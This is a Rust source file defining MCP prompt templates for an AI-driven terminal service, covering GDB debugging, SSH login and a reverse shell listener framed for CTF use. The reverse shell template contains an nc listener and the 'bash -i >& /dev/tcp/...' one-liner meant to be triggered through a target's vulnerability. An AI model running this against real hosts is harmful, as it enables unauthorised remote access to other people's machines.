// src/service/prompts.rs
use super::TerminalMcpService;
use rmcp::{handler::server::wrapper::Parameters, model::*, prompt, prompt_router, schemars};
use serde::{Deserialize, Serialize};

#[derive(Debug, Serialize, Deserialize, schemars::JsonSchema)]
pub struct GdbDebugArgs {
    #[schemars(description = "Path to the executable to debug")]
    pub binary_path: String,
    #[schemars(description = "Session tag, defaults to gdb1")]
    pub tag: Option<String>,
}

#[derive(Debug, Serialize, Deserialize, schemars::JsonSchema)]
pub struct SshConnectArgs {
    #[schemars(description = "Target host, IP or domain")]
    pub host: String,
    #[schemars(description = "Login username")]
    pub user: String,
    #[schemars(description = "Session tag, defaults to ssh1")]
    pub tag: Option<String>,
}

#[derive(Debug, Serialize, Deserialize, schemars::JsonSchema)]
pub struct ReverseShellArgs {
    #[schemars(description = "Attacker (local) IP address accessible by the target")]
    pub attacker_ip: String,
    #[schemars(description = "Listening port, defaults to 4444")]
    pub port: Option<u16>,
    #[schemars(description = "Session tag, defaults to listener")]
    pub tag: Option<String>,
}

#[prompt_router(vis = "pub(crate)")]
impl TerminalMcpService {
    #[prompt(name = "shell_usage_guide", description = "Quick reference for core usage principles: when to use exec, when to use interactive sessions")]
    async fn shell_usage_guide(&self) -> Vec<PromptMessage> {
        vec![PromptMessage::new_text(Role::User, crate::docs::QUICK_START)]
    }

    #[prompt(name = "gdb_debug_session", description = "Generate GDB debugging steps for a specified binary")]
    async fn gdb_debug_session(
        &self,
        Parameters(GdbDebugArgs { binary_path, tag }): Parameters<GdbDebugArgs>,
    ) -> Vec<PromptMessage> {
        let tag = tag.unwrap_or_else(|| "gdb1".to_string());
        vec![PromptMessage::new_text(
            Role::User,
            format!(
                "Debug {binary_path} (tag=\"{tag}\"):\n\
                 1. shell_spawn(shell=\"bash\", tag=\"{tag}\")\n\
                 2. shell_send_line(input=\"gdb {binary_path}\", tag=\"{tag}\")\n\
                 3. shell_output(tag=\"{tag}\", idle_ms=1000) confirm the prompt appears\n\
                 4. Confirm with shell_output after every gdb command before proceeding; use \
                    shell_wait_for(tag=\"{tag}\", pattern=\"Breakpoint\", timeout_ms=5000) to wait for \
                    continue/run instead of guessing idle_ms\n\
                 5. Once finished, shell_close(tag=\"{tag}\")\n\
                 See guide://shell/gdb for details"
            ),
        )]
    }

    #[prompt(name = "ssh_connect_session", description = "Generate step-by-step SSH connection operations for a target host")]
    async fn ssh_connect_session(
        &self,
        Parameters(SshConnectArgs { host, user, tag }): Parameters<SshConnectArgs>,
    ) -> Vec<PromptMessage> {
        let tag = tag.unwrap_or_else(|| "ssh1".to_string());
        vec![PromptMessage::new_text(
            Role::User,
            format!(
                "Connect to {user}@{host} (tag=\"{tag}\"):\n\
                 1. shell_spawn(shell=\"bash\", tag=\"{tag}\")\n\
                 2. shell_send_line(input=\"ssh {user}@{host}\", tag=\"{tag}\")\n\
                 3. shell_output(tag=\"{tag}\", idle_ms=1500), respond dynamically based on actual output\n\
                    (yes/password/directly entering remote prompt)\n\
                 4. Execute remote commands only after successful login, use exit and then shell_close(tag=\"{tag}\") before finishing\n\
                 See guide://shell/ssh for details"
            ),
        )]
    }

    #[prompt(name = "reverse_shell_session", description = "Generate reverse shell listening operations for CTF scenarios")]
    async fn reverse_shell_session(
        &self,
        Parameters(ReverseShellArgs { attacker_ip, port, tag }): Parameters<ReverseShellArgs>,
    ) -> Vec<PromptMessage> {
        let port = port.unwrap_or(4444);
        let tag = tag.unwrap_or_else(|| "listener".to_string());
        vec![PromptMessage::new_text(
            Role::User,
            format!(
                "Establish a reverse shell listener on {attacker_ip}:{port} (tag=\"{tag}\"):\n\
                 1. shell_spawn(shell=\"bash\", tag=\"{tag}\")\n\
                 2. shell_send_line(input=\"nc -lvnp {port}\", tag=\"{tag}\")\n\
                 3. shell_output(tag=\"{tag}\", idle_ms=500) confirm listening status\n\
                 4. Trigger via target machine vulnerability, similar to:\n\
                    bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1\n\
                 5. shell_output(tag=\"{tag}\", idle_ms=2000) confirm the target machine prompt is acquired\n\
                 6. Send subsequent commands via shell_send_line(tag=\"{tag}\"), every step must use \
                    shell_output to confirm the result\n\
                 7. Once finished, shell_close(tag=\"{tag}\")\n\
                 See guide://shell/reverse_shell and guide://shell/security for details"
            ),
        )]
    }
}